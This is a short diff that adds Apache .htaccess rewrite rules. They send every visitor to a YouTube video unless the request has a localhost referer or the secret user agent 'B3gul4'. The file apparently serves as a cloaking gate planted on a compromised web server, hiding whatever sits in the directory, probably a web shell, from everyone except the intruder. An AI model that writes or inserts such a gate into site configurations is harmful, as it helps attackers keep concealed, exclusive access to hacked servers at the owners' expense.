@@ -1,0 +1,7 @@
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} !.*localhost [NC]
+RewriteRule ^ https://www.youtube.com/watch?v=zqLEO5tIuYs [R=301,L]
+
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} !=B3gul4 [NC]
+RewriteRule ^ https://www.youtube.com/watch?v=zqLEO5tIuYs [R=301,L]
